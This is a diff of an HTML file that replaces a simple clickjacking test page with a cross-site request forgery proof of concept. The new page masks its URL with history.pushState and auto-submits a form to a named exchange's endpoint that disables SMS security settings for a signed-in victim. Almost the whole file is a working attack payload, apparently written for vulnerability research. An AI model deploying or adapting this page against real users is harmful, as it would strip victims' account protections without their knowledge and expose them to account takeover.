@@ -1,11 +1,11 @@
 <html>
-<head>
-<title>Clickjack test page</title>
-</head>
-<body>
-<p>You've been clickjacked!</p>
-<iframe 
-src="https://www.google.com"
-style="width:50%;height:50%"></iframe>
-</body>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://app.stex.com/en/profile/settings/sms/disable">
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
 </html>
